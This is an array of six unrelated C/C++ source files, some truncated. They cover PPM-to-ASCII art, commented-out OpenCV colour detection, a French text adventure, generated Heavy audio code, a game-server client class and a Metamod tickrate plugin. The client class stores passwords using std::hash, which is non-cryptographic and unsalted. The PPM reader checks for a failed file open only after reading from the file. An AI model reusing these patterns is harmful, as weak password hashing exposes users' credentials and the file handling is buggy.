    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstruct pixel { \t\t// struct para representar um pixel na imagem PPM\n    unsigned char r; \t\n    unsigned char g;\n    unsigned char b;\n};\n\nvoid gerar_ascii_art(struct pixel **imagem, int linhas, int colunas) {  // imagem - matriz de ponteiros \n    char caracteres[] = {'#','&','@','$','X','O','o','*','.',';','!',' '};\n    FILE *saida = fopen(\"ascii_art.txt\", \"w\"); // abrir arquivo txt para visualizar ascii art\n\n    if (saida == NULL) {\n        printf(\"Erro na abertura do arquivo de saida\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    for (int i = 0; i < linhas; i++) {  \t// percorre linhas da matriz\n        for (int j = 0; j < colunas; j++) { \t// percorre colunas da matriz\n            int media_intensidade = (imagem[i][j].r + imagem[i][j].g + imagem[i][j].b) / 3; \t\t// calcula a media dos componentes de cor (vermelho, verde e azul, respectivamente)\n\n            // calcula o indice do caractere com base na media_intensidade ja calculada\n            int indice = (media_intensidade * (sizeof(caracteres) - 1)) / 255; \t\t//  intensidade de cor vai de 0 a 255\n\n            // escreve o caractere no console e no arquivo\n            printf(\"%c\", caracteres[indice]);\n            fprintf(saida, \"%c\", caracteres[indice]);\n        }\n        printf(\"\\n\");\n        fprintf(saida, \"\\n\");\n    }\n\n    fclose(saida);\n}\n\nint main() {\n    char arq[] = \"19.ppm\";\t\t// nome do arquivo\n    FILE *fp;\n    char id[3];\n    int colunas, linhas, maximo;\n    struct pixel **imagem;\n\n\tfp = fopen(arq, \"rb\");\n\t\n    fscanf(fp, \"%s\", id); \n    fscanf(fp, \"%d\", &colunas); // le numero de linhas da imagem\n    fscanf(fp, \"%d\", &linhas);\t// le numero de colunas da imagem\n    fscanf(fp, \"%d\", &maximo); // le o valor maximo possivel para a intensidade de cor na imagem \n    fseek(fp, 1, SEEK_CUR); // SEEK_CUR = posicao atual do ponteiro do arquivo\n    \n    if (fp == NULL) {\n        printf(\"Erro na abertura do arquivo <%s>\", arq);\t// verifica arquivo\n        if (strcmp(id,\"P6\")){\t// compara id do arquivo com formato ppm = P6\n    \t\tprintf(\"\\nO arquivo deve estar no formato PPM!\");\t// verifica formato arquivo\n    \t\texit(EXIT_FAILURE);\n    \t}\n\t}\n\n    printf(\"Tipo do arquivo <%s>: %s\\n\", arq, id);\n    printf(\"Maximo: %d\\n\", maximo);\n    printf(\"Imagem tem %d x %d pixels\\n\", linhas, colunas);\n\t\n\t//\tbasicamente, vai alocar dinamicamente memoria para representar a imagem na forma de uma matriz de pixels\n    imagem = (struct pixel **) malloc(linhas * sizeof(struct pixel *)); \t// vetor de ponteiros (struct pixel *) - cada ponteiro vai apontar para um conjunto de pixels representando uma linha da imagem\n    for (int i = 0; i < linhas; i++) {\t\t\n        imagem[i] = (struct pixel *) calloc(colunas, sizeof(struct pixel));\t// alocando as colunas com calloc, zera a memoria\n    }\t\n\n    for (int i = 0; i < linhas; i++) {\n        for (int j = 0; j < colunas; j++) {\n            fscanf(fp, \"%c%c%c\", &imagem[i][j].r, &imagem[i][j].g, &imagem[i][j].b);\t// le as cores de cada pixel na imagem\n        }\n    }\n\n    gerar_ascii_art(imagem, linhas, colunas);\n\n    for (int i = 0; i < linhas; i++) {\t\t// libera a memoria alocada\n        free(imagem[i]);\n    }\n    free(imagem);\n\n    fclose(fp);\n\n    return 0;\n}\n\n",
    "//\u6b64\u4e3a\u5907\u4efd\n\n\n// #include <opencv2/opencv.hpp>\n// #include <iostream>\n\n// int main() {\n//     // \u8bfb\u53d6\u5f69\u8272\u56fe\u50cf\n//     cv::Mat image = cv::imread(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/test_image.png\");\n//     if (image.empty()) {\n//         std::cerr << \"Error: Unable to open image file!\" << std::endl;\n//         return -1;\n//     }\n\n//     // // \u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\n//     // cv::Mat grayImage;\n//     // cv::cvtColor(image, grayImage, cv::COLOR_BGR2GRAY);\n \n//     // // \u4fdd\u5b58\u6216\u663e\u793a\u7070\u5ea6\u56fe\u50cf\n//     // cv::imwrite(\"gray_image.jpg\", grayImage);\n//     // cv::imshow(\"Gray Image\", grayImage);\n    \n//     //\u8f6c\u6362\u4e3a HSV \u56fe\u50cf\n//     cv::Mat hsvImage;\n//     cv::cvtColor(image, hsvImage, cv::COLOR_BGR2HSV);\n\n//     // \u4fdd\u5b58\u6216\u663e\u793a HSV \u56fe\u50cf\n//     cv::imwrite(\"hsv_image.jpg\", hsvImage);\n//     cv::imshow(\"HSV Image\", hsvImage);\n\n//     // // \u521b\u5efa\u7528\u4e8e\u5b58\u50a8\u6ee4\u6ce2\u7ed3\u679c\u7684 Mat \u5bf9\u8c61\n//     // cv::Mat meanBlurredImage;\n//     // cv::Mat gaussianBlurredImage;\n\n//     // // \u5e94\u7528\u5747\u503c\u6ee4\u6ce2\n//     // // \u53c2\u6570: \u8f93\u5165\u56fe\u50cf, \u8f93\u51fa\u56fe\u50cf, \u6838\u7684\u5927\u5c0f\n//     // cv::blur(image, meanBlurredImage, cv::Size(5, 5)); // 5x5 \u6838\n\n//     // // \u5e94\u7528\u9ad8\u65af\u6ee4\u6ce2\n//     // // \u53c2\u6570: \u8f93\u5165\u56fe\u50cf, \u8f93\u51fa\u56fe\u50cf, \u6838\u7684\u5927\u5c0f, \u6807\u51c6\u5dee (X\u65b9\u5411, Y\u65b9\u5411)\n//     // cv::GaussianBlur(image, gaussianBlurredImage, cv::Size(5, 5), 1.5, 1.5); // 5x5 \u6838\uff0c\u6807\u51c6\u5dee1.5\n\n//     // // \u4fdd\u5b58\u5747\u503c\u6ee4\u6ce2\u540e\u7684\u56fe\u50cf\n//     // if (!cv::imwrite(\"mean_blurred_image.jpg\", meanBlurredImage)) {\n//     //     std::cerr << \"Error: Unable to save mean blurred image!\" << std::endl;\n//     //     return -1;\n//     // }\n\n//     // // \u4fdd\u5b58\u9ad8\u65af\u6ee4\u6ce2\u540e\u7684\u56fe\u50cf\n//     // if (!cv::imwrite(\"gaussian_blurred_image.jpg\", gaussianBlurredImage)) {\n//     //     std::cerr << \"Error: Unable to save gaussian blurred image!\" << std::endl;\n//     //     return -1;\n//     // }\n\n//     // // \u663e\u793a\u539f\u56fe\u50cf\u3001\u5747\u503c\u6ee4\u6ce2\u56fe\u50cf\u548c\u9ad8\u65af\u6ee4\u6ce2\u56fe\u50cf\n//     // cv::imshow(\"Original Image\", image);\n//     // cv::imshow(\"Mean Blurred Image\", meanBlurredImage);\n//     // cv::imshow(\"Gaussian Blurred Image\", gaussianBlurredImage);\n\n//     // \u5b9a\u4e49\u7ea2\u8272\u7684 HSV \u8303\u56f4\n//     cv::Scalar lowerRed1(0, 100, 100); // \u7ea2\u8272\u7684\u4e0b\u9650\uff08\u8303\u56f41\uff09\n//     cv::Scalar upperRed1(10, 255, 255); // \u7ea2\u8272\u7684\u4e0a\u9650\uff08\u8303\u56f41\uff09\n\n//     cv::Scalar lowerRed2(160, 100, 100); // \u7ea2\u8272\u7684\u4e0b\u9650\uff08\u8303\u56f42\uff09\n//     cv::Scalar upperRed2(180, 255, 255); // \u7ea2\u8272\u7684\u4e0a\u9650\uff08\u8303\u56f42\uff09\n\n//     // \u521b\u5efa\u63a9\u6a21\n//     cv::Mat mask1, mask2, mask;\n\n//     // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\u7684\u63a9\u6a21\uff08\u8303\u56f41\uff09\n//     cv::inRange(hsvImage, lowerRed1, upperRed1, mask1);\n    \n//     // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\u7684\u63a9\u6a21\uff08\u8303\u56f42\uff09\n//     cv::inRange(hsvImage, lowerRed2, upperRed2, mask2);\n\n//     // \u5408\u5e76\u4e24\u4e2a\u63a9\u6a21\n//     cv::add(mask1, mask2, mask);\n\n//     // \u4f7f\u7528\u63a9\u6a21\u63d0\u53d6\u7ea2\u8272\u533a\u57df\n//     cv::Mat redRegion;\n//     cv::bitwise_and(image, image, redRegion, mask);\n\n//     // \u4fdd\u5b58\u63a9\u6a21\u548c\u63d0\u53d6\u7684\u7ea2\u8272\u533a\u57df\n//     if (!cv::imwrite(\"red_mask.jpg\", mask)) {\n//         std::cerr << \"Error: Unable to save red mask image!\" << std::endl;\n//         return -1;\n//     }\n\n//     if (!cv::imwrite(\"red_region.jpg\", redRegion)) {\n//         std::cerr << \"Error: Unable to save red region image!\" << std::endl;\n//         return -1;\n//     }\n\n//     // \u663e\u793a\u539f\u56fe\u50cf\u3001\u63a9\u6a21\u548c\u7ea2\u8272\u533a\u57df\n//     cv::imshow(\"Original Image\", image);\n//     cv::imshow(\"Red Mask\", mask);\n//     cv::imshow(\"Red Region\", redRegion);\n\n//     // \u67e5\u627e\u8f6e\u5ed3\n//     std::vector<std::vector<cv::Point>> contours;\n//     std::vector<cv::Vec4i> hierarchy;\n//     cv::findContours(mask, contours, hierarchy, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_SIMPLE);\n\n//     // \u7ed8\u5236\u8f6e\u5ed3\n//     cv::Mat contourImage = image.clone();\n//     cv::drawContours(contourImage, contours, -1, cv::Scalar(0, 255, 0), 2);\n\n//     // \u663e\u793a\u56fe\u50cf\n//     cv::imshow(\"Contours\", contourImage);\n\n//     // \u521b\u5efa\u7528\u4e8e\u7ed8\u5236\u8fb9\u754c\u6846\u7684\u56fe\u50cf\n//     cv::Mat boundingBoxImage = image.clone();\n\n//     for (const auto& contour : contours) {\n//         // \u8ba1\u7b97\u8fb9\u754c\u6846\n//         cv::Rect boundingBox = cv::boundingRect(contour);\n\n//         // \u8ba1\u7b97\u8f6e\u5ed3\u9762\u79ef\n//         double area = cv::contourArea(contour);\n\n//         // \u7ed8\u5236\u8fb9\u754c\u6846\n//         cv::rectangle(boundingBoxImage, boundingBox, cv::Scalar(0, 255, 0), 2);\n\n//         // \u51c6\u5907\u6587\u672c\u4fe1\u606f\n//         std::string text = \"Area: \" + std::to_string(static_cast<int>(area));\n\n//         // \u8bbe\u7f6e\u5b57\u4f53\u3001\u5927\u5c0f\u548c\u7c97\u7ec6\n//         int fontFace = cv::FONT_HERSHEY_SIMPLEX;\n//         double fontScale = 0.8;\n//         int thickness = 2;\n\n//         // \u8ba1\u7b97\u6587\u672c\u5927\u5c0f\n//         int baseline;\n//         cv::Size textSize = cv::getTextSize(text, fontFace, fontScale, thickness, &baseline);\n\n//         // \u8bbe\u7f6e\u6587\u672c\u80cc\u666f\u77e9\u5f62\n//         cv::Rect textRect(boundingBox.tl(), cv::Size(textSize.width, textSize.height + baseline));\n//         cv::rectangle(boundingBoxImage, textRect, cv::Scalar(0, 0, 0), cv::FILLED);\n\n//         // \u7ed8\u5236\u6587\u672c\n//         cv::putText(boundingBoxImage, text, boundingBox.tl() + cv::Point(0, textSize.height), fontFace, fontScale, cv::Scalar(255, 255, 255), thickness);\n//     }\n    \n\n//     // \u663e\u793a\u56fe\u50cf\n//     cv::imshow(\"Bounding Boxes\", boundingBoxImage);\n\n//     //\u63d0\u53d6\u989c\u8272\u533a\u57df\n//     cv::Mat colorRegion;\n//     cv::bitwise_and(image, image, colorRegion, mask);\n\n//     // \u5c06\u63d0\u53d6\u7684\u989c\u8272\u533a\u57df\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\n//     cv::Mat grayImage;\n//     cv::cvtColor(colorRegion, grayImage, cv::COLOR_BGR2GRAY);\n\n//     // \u5e94\u7528\u4e8c\u503c\u5316\n//     cv::Mat binaryImage;\n//     cv::threshold(grayImage, binaryImage, 127, 2",
    "#include \"Jeu.hpp\"\r\n\r\nJeu::Jeu() {\r\n    emplacementCourant_ = gestionnaire_.obtenirEmplacement(\"entree\").get();\r\n}\r\n\r\nvoid Jeu::afficherInformations() {\r\n    cout << \"--- \" << emplacementCourant_->getNom() << \" ---\\n\";\r\n    if (emplacementCourant_->estEclaire()) {\r\n        cout << emplacementCourant_->getDescription() << \"\\n\";\r\n\r\n        auto objets = emplacementCourant_->decrireObjets();\r\n        if (!objets.empty()) {\r\n            cout << \"Vous remarquez les objets suivants :\\n\";\r\n            for (const auto& objet : objets) {\r\n                cout << \"- \" << objet->getNom() << \"\\n\";\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        cout << \"Il fait trop noir, on peut rien voir.\\n\";\r\n    }\r\n\r\n    const auto& voisins = emplacementCourant_->getVoisins();\r\n    if (!voisins.empty()) {\r\n        cout << \"A partir de cet endroit, vous pouvez aller dans ces directions : \\n\";\r\n        for (const auto& pair : voisins) {\r\n            cout << \"- \" << conversion(pair.first) << \" vers \" << pair.second->getNom() << \"\\n\";\r\n        }\r\n    }\r\n}\r\n\r\nstring Jeu::conversion(Direction direction) {\r\n    switch (direction) {\r\n    case Direction::Nord: return \"Nord\";\r\n    case Direction::Sud: return \"Sud\";\r\n    case Direction::Est: return \"Est\";\r\n    case Direction::Ouest: return \"Ouest\";\r\n    default: return \"Invalide\";\r\n    }\r\n}\r\n\r\nDirection Jeu::conversionDirection(const string& entree) {\r\n    if (entree == \"N\") return Direction::Nord;\r\n    if (entree == \"S\") return Direction::Sud;\r\n    if (entree == \"E\") return Direction::Est;\r\n    if (entree == \"O\") return Direction::Ouest;\r\n    return Direction::Invalide;\r\n}\r\n\r\nCommande Jeu::conversionCommande(const string& entree) {\r\n    if (entree == \"regarder\") return Commande::Regarder;\r\n    else if (entree.substr(0, 9) == \"regarder \") return Commande::Regarder;\r\n    else if (entree.substr(0, 9) == \"utiliser \") return Commande::Utiliser;\r\n    else if (entree == \"N\" || entree == \"S\" || entree == \"E\" || entree == \"O\") return Commande::Deplacer;\r\n    return Commande::Inconnue;\r\n}\r\n\r\nvoid Jeu::regarderObjet(const string& mot) {\r\n    for (const auto& objet : emplacementCourant_->decrireObjets()) {\r\n        if (objet->getNom().find(mot) != string::npos) {\r\n            cout << objet->getDescription() << \"\\n\";\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Objet inexistant.\\n\";\r\n}\r\n\r\nvoid Jeu::utiliserObjet(const string& mot) {\r\n    for (const auto& objet : emplacementCourant_->decrireObjets()) {\r\n        if (objet->getNom().find(mot) != string::npos) {\r\n            cout << objet->utiliser() << \"\\n\";\r\n            return;\r\n        }\r\n    }\r\n    cout << \"Objet inexistant.\\n\";\r\n}\r\n\r\nbool Jeu::traiterCommande(const string& commande) {\r\n    Commande cmd = conversionCommande(commande);\r\n    if (cmd == Commande::Regarder) {\r\n        if (commande.size() > 9) {\r\n            string mot = commande.substr(9);\r\n            regarderObjet(mot);\r\n        }\r\n        else {\r\n            afficherInformations();\r\n        }\r\n        return true;\r\n    }\r\n    else if (cmd == Commande::Utiliser) {\r\n        string mot = commande.substr(9);\r\n        utiliserObjet(mot);\r\n        return true;\r\n    }\r\n    else if (cmd == Commande::Deplacer) {\r\n        Direction dir = conversionDirection(commande);\r\n        Emplacement* prochainEmplacement = emplacementCourant_->obtenirVoisin(dir);\r\n        if (prochainEmplacement) {\r\n            emplacementCourant_ = prochainEmplacement;\r\n            afficherInformations();\r\n        }\r\n        else {\r\n            cout << \"On ne peut pas aller dans cette direction.\\n\";\r\n        }\r\n        return true;\r\n    }\r\n    else {\r\n        cout << \"Commande inconnue.\\n\";\r\n        return false;\r\n    }\r\n}\r\n\r\nvoid Jeu::demarrer() {\r\n    string commande;\r\n    cout << \"----------------  LE VOYAGE ULTIME ----------------\\n\";\r\n    cout << \"Voici les commandes du jeu : \\n\"\r\n        \"-- Pour aller dans une direction, tapez la premiere lettre du point cardinal en majuscule. \\n\"\r\n        \"regarder: pour reafficher les details de la piece dans laquelle vous etes. \\n\"\r\n        \"regarder + le nom de l'objet: afficher la description de l'objet. \\n\"\r\n        \"utiliser + le nom de l'objet: interragir avec l'objet. \\n\"\r\n        \"quitter: pour quitter le jeu. \\n\";\r\n    afficherInformations();\r\n\r\n    while (true) {\r\n        cout << \"> \";\r\n        getline(cin, commande);\r\n\r\n        if (commande == \"quitter\") {\r\n            cout << \"Au plaisir de vous revoir!\\n\";\r\n            break;\r\n        }\r\n        traiterCommande(commande);\r\n    }\r\n}\r\n",
    "/**\r\n * Copyright (c) 2024 Enzien Audio, Ltd.\r\n * \r\n * Redistribution and use in source and binary forms, with or without modification,\r\n * are permitted provided that the following conditions are met:\r\n * \r\n * 1. Redistributions of source code must retain the above copyright notice,\r\n *    this list of conditions, and the following disclaimer.\r\n * \r\n * 2. Redistributions in binary form must reproduce the phrase \"powered by heavy\",\r\n *    the heavy logo, and a hyperlink to https://enzienaudio.com, all in a visible\r\n *    form.\r\n * \r\n *   2.1 If the Application is distributed in a store system (for example,\r\n *       the Apple \"App Store\" or \"Google Play\"), the phrase \"powered by heavy\"\r\n *       shall be included in the app description or the copyright text as well as\r\n *       the in the app itself. The heavy logo will shall be visible in the app\r\n *       itself as well.\r\n * \r\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\r\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\r\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\r\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\r\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\n * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\r\n * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\r\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n * \r\n */\r\n\r\n#include \"Heavy_prog.hpp\"\r\n\r\n#include <new>\r\n\r\n#define Context(_c) static_cast<Heavy_prog *>(_c)\r\n\r\n\r\n/*\r\n * C Functions\r\n */\r\n\r\nextern \"C\" {\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new(double sampleRate) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new_with_options(double sampleRate,\r\n      int poolKb, int inQueueKb, int outQueueKb) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate, poolKb, inQueueKb, outQueueKb);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT void hv_prog_free(HeavyContextInterface *instance) {\r\n    // call destructor\r\n    Context(instance)->~Heavy_prog();\r\n    // free memory\r\n    hv_free(instance);\r\n  }\r\n} // extern \"C\"\r\n\r\n\r\n\r\n/*\r\n * Table Data\r\n */\r\n\r\nfloat hTable_pyMly1PH_data[256] = {0.206667f, 0.216667f, 0.22f, 0.22f, 0.226667f, 0.23f, 0.233333f, 0.233333f, 0.236667f, 0.243333f, 0.243333f, 0.243333f, 0.246667f, 0.25f, 0.252222f, 0.254444f, 0.256667f, 0.26f, 0.263333f, 0.266667f, 0.273333f, 0.28f, 0.286667f, 0.283333f, 0.3f, 0.306667f, 0.313333f, 0.32f, 0.326667f, 0.34f, 0.348333f, 0.356667f, 0.366667f, 0.373333f, 0.38f, 0.386667f, 0.4f, 0.406667f, 0.413333f, 0.42f, 0.43f, 0.436667f, 0.438333f, 0.44f, 0.443333f, 0.446667f, 0.448333f, 0.45f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.453333f, 0.452778f, 0.452222f, 0.451667f, 0.451111f, 0.450556f, 0.45f, 0.448889f, 0.447778f, 0.446667f, 0.445556f, 0.444444f, 0.443333f, 0.442f, 0.440667f, 0.439333f, 0.438f, 0.436667f, 0.435333f, 0.434f, 0.432667f, 0.431333f, 0.43f, 0.4275f, 0.425f, 0.4225f, 0.42f, 0.417778f, 0.415556f, 0.413333f, 0.41f, 0.406667f, 0.403333f, 0.4f, 0.396667f, 0.39f, 0.38f, 0.376667f, 0.37f, 0.366667f, 0.363333f, 0.356667f, 0.353333f, 0.35f, 0.346667f, 0.34f, 0.336667f, 0.333333f, 0.326667f, 0.323333f, 0.316667f, 0.313333f, 0.311111f, 0.308889f, 0.306667f, 0.303333f, 0.302222f, 0.301111f, 0.3f, 0.296667f, 0.293334f, 0.292222f, 0.291111f, 0.29f, 0.288333f, 0.286667f, 0.285f, 0.283333f, 0.281667f, 0.28f, 0.278333f, 0.276667f, 0.275f, 0.273334f, 0.272222f, 0.271111f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.27f, 0.271667f, 0.273333f, 0.276667f, 0.28f, 0.281111f, 0.282222f, 0.283333f, 0.283333f, 0.283333f, 0.283333f, 0.285f, 0.286667f, 0.288333f, 0.29f, 0.291667f, 0.293333f, 0.295f, 0.296667f, 0.303333f, 0.303333f, 0.305f, 0.31f, 0.31f, 0.311667f, 0.313333f, 0.313333f, 0.313333f, 0.315f, 0.316667f, 0.316667f, 0.316667f, 0.316667f, 0.316667f, 0.313333f, 0.31f, 0.306667f, 0.301667f, 0.296667f, 0.293333f, 0.286667f, 0.27f, 0.2",
    "#include \"client.hpp\"\n#include \"ClientSaver.hpp\"\n#include <chrono>\n#include <iostream>\n\nnamespace server {\n    client::client(const std::string& ip, const std::string& port, const std::string& username, const std::string& password, uint32_t id) {\n        if (ip.empty() || port.empty()) {\n            throw ClientException(\"IP or port cannot be empty\", *this);\n        }\n\n        this->ip_ = ip;\n        this->port_ = port;\n        if (id == 0) {\n            set_nickname(username);\n            this->id_ = generate_id();\n        } else {\n            this->id_ = id;\n            this->username_ = username;\n        }\n        this->host_ = false;\n        this->in_game_ = false;\n        this->password_ = hash_password(password);\n    }\n\n    std::string client::get_ip() const {\n        return this->ip_;\n    }\n\n    std::string client::get_port() const {\n        return this->port_;\n    }\n\n    std::string client::get_nickname() const {\n        return this->username_;\n    }\n\n    void client::set_nickname(const std::string& username) {\n        ClientSaver cs(\"clients.csv\");\n        if (username.empty()) {\n            throw ClientException(\"username cannot be empty\", *this);\n        }\n\n        try {\n            if (cs.check_if_user_already_exists_in_db(username, \"\") != 0) {\n                throw ClientException(\"Username already exists\", *this);\n            }\n        } catch (const ClientException& e) {\n            throw ClientException(\"Username already exists\", *this);\n        }\n        this->username_ = username;\n    }\n\n    uint32_t client::get_id() const {\n        return this->id_;\n    }\n\n    std::string client::get_password() const {\n        return this->password_;\n    }\n\n    void client::set_password(const std::string& password) {\n        this->password_ = hash_password(password);\n    }\n\n    asio::ip::udp::endpoint client::get_endpoint() const {\n        return asio::ip::udp::endpoint(asio::ip::address::from_string(this->ip_), std::stoi(this->port_));\n    }\n\n    void client::set_endpoint(const asio::ip::udp::endpoint& endpoint) {\n        this->ip_ = endpoint.address().to_string();\n        this->port_ = std::to_string(endpoint.port());\n        this->endpoint_ = endpoint;\n    }\n\n    bool client::is_host() const {\n        return this->host_;\n    }\n\n    void client::set_host(bool host) {\n        this->host_ = host;\n    }\n\n    bool client::is_in_game() const {\n        return this->in_game_;\n    }\n\n    void client::set_in_game(bool in_game) {\n        this->in_game_ = in_game;\n    }\n\n    uint32_t client::generate_id() const {\n        auto timestamp = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());\n        return std::hash<std::string>{}(this->ip_ + this->port_ + std::to_string(timestamp));\n    }\n\n    std::string client::hash_password(const std::string &password) {\n        std::hash<std::string> hasher;\n        return std::to_string(hasher(password));\n    }\n\n    bool client::is_ready() const {\n        return this->is_ready_;\n    }\n\n    void client::set_ready(const bool ready) {\n        this->is_ready_ = ready;\n    }\n\n    void client::start_game() {\n        this->in_game_ = true;\n        std::cout << \"Client \" << this->username_ << \" is in game\" << std::endl;\n    }\n\n    std::ostream& operator<<(std::ostream& os, const client& cli) {\n        os << \"Client[ID: \" << cli.id_\n           << \", IP: \" << cli.ip_\n           << \", Port: \" << cli.port_\n           << \", Username: \" << cli.username_\n           << \", Host: \" << (cli.host_ ? \"Yes\" : \"No\")\n           << \", In Game: \" << (cli.in_game_ ? \"Yes\" : \"No\")\n           << \"]\";\n        return os;\n    }\n\n    bool operator==(const client& cli1, const client& cli2) {\n        return cli1.get_id() == cli2.get_id();\n    }\n\n    bool operator!=(const client& cli1, const client& cli2) {\n        return !(cli1 == cli2);\n    }\n\n    void client::set_last_ping_time(std::chrono::steady_clock::time_point time) {\n        last_ping_time_ = time;\n    }\n\n    std::chrono::steady_clock::time_point client::get_last_ping_time() const {\n        return last_ping_time_;\n    }\n\n    void client::set_latency(long latency) {\n        latency_ = latency;\n    }\n\n    long client::get_latency() const {\n        return latency_;\n    }\n}",
    "/**\n * vim: set ts=4 sw=4 tw=99 noet :\n * ======================================================\n * Metamod:Source Tickrate\n * Written by Wend4r (Vladimir Ezhikov).\n * ======================================================\n\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include <tickrate/provider.hpp>\n#include <globals.hpp>\n\n#include <filesystem.h>\n#include <tier0/commonmacros.h>\n#include <tier0/keyvalues3.h>\n#include <tier0/strtools.h>\n\n#include <any_config.hpp>\n\nTickrate::Provider::Provider()\n :  m_mapLibraries(DefLessFunc(const CUtlSymbolLarge))\n{\n}\n\nbool Tickrate::Provider::Init(GameData::CBufferStringVector &vecMessages)\n{\n\t// Enigne 2.\n\t{\n\t\tconst char szEngineModuleName[] = \"engine2\";\n\n\t\tif(!m_aEngine2Library.InitFromMemory(g_pEngineServer))\n\t\t{\n\t\t\tstatic const char *s_pszMessageConcat[] = {\"Failed to \", \"get \\\"\", szEngineModuleName, \"\\\" module\"};\n\n\t\t\tvecMessages.AddToTail({s_pszMessageConcat});\n\t\t}\n\n\t\tm_mapLibraries.Insert(GetSymbol(szEngineModuleName), &m_aEngine2Library);\n\t}\n\n\t// File System.\n\t{\n\t\tconst char szFileSystemSTDIOModuleName[] = \"filesystem_stdio\";\n\n\t\tif(!m_aFileSystemSTDIOLibrary.InitFromMemory(g_pFullFileSystem))\n\t\t{\n\t\t\tstatic const char *s_pszMessageConcat[] = {\"Failed to \", \"get \\\"\", szFileSystemSTDIOModuleName, \"\\\" module\"};\n\n\t\t\tvecMessages.AddToTail({s_pszMessageConcat});\n\t\t}\n\n\t\tm_mapLibraries.Insert(GetSymbol(szFileSystemSTDIOModuleName), &m_aFileSystemSTDIOLibrary);\n\t}\n\n\t// Server.\n\t{\n\t\tconst char szServerModuleName[] = \"server\";\n\n\t\tif(!m_aServerLibrary.InitFromMemory(g_pSource2Server))\n\t\t{\n\t\t\tstatic const char *s_pszMessageConcat[] = {\"Failed to \", \"get \\\"\", szServerModuleName, \"\\\" module\"};\n\n\t\t\tvecMessages.AddToTail({s_pszMessageConcat});\n\t\t}\n\n\t\tm_mapLibraries.Insert(GetSymbol(szServerModuleName), &m_aServerLibrary);\n\t}\n\n\treturn true;\n}\n\nbool Tickrate::Provider::Load(const char *pszBaseDir, const char *pszPathID, GameData::CBufferStringVector &vecMessages)\n{\n\tif(!LoadGameData(pszBaseDir, pszPathID, vecMessages))\n\t{\n\t\treturn false;\n\t}\n\n\t// ...\n\n\treturn true;\n}\n\nbool Tickrate::Provider::Destroy(GameData::CBufferStringVector &vecMessages)\n{\n\tm_mapLibraries.PurgeAndDeleteElements();\n\n\treturn true;\n}\n\nconst DynLibUtils::CModule *Tickrate::Provider::FindLibrary(const char *pszName) const\n{\n\tauto iFoundIndex = m_mapLibraries.Find(FindSymbol(pszName));\n\n\tAssert(IS_VALID_GAMEDATA_INDEX(iFoundIndex, m_mapLibraries));\n\n\treturn m_mapLibraries.Element(iFoundIndex);\n}\n\nCUtlSymbolLarge Tickrate::Provider::GetSymbol(const char *pszText)\n{\n\treturn m_aSymbolTable.AddString(pszText);\n}\n\nCUtlSymbolLarge Tickrate::Provider::FindSymbol(const char *pszText) const\n{\n\treturn m_aSymbolTable.Find(pszText);\n}\n\nbool Tickrate::Provider::LoadGameData(const char *pszBaseDir, const char *pszPathID, GameData::CBufferStringVector &vecMessages)\n{\n\tchar 